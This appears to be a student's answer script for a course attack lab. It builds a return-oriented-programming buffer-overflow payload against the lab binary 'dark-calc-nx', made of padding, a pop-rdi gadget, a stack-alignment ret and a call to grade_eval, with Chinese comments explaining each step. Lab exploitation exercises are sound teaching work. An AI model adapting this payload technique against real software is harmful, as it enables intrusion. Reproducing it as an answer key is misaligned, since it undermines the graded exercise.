#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

OFFSET = 24      #偏移量
POP_RDI_RET = 0x401a33
RET = 0x401a34
GRADE_EVAL = 0x401978
MAIN = 0x4019b4

# 把整数转换为小端序数据
def p64(value):
    return struct.pack("<Q", value)

payload = (
    b"A" * OFFSET      #填充缓冲区并到达返回地址
    + p64(POP_RDI_RET)     #跳转到 pop rdi; ret
    + p64(4)
    + p64(RET)            #额外的 ret，调整栈对齐
    + p64(GRADE_EVAL)     #跳转到 grade_eval
    + p64(MAIN)
)

sys.stdout.buffer.write(payload)
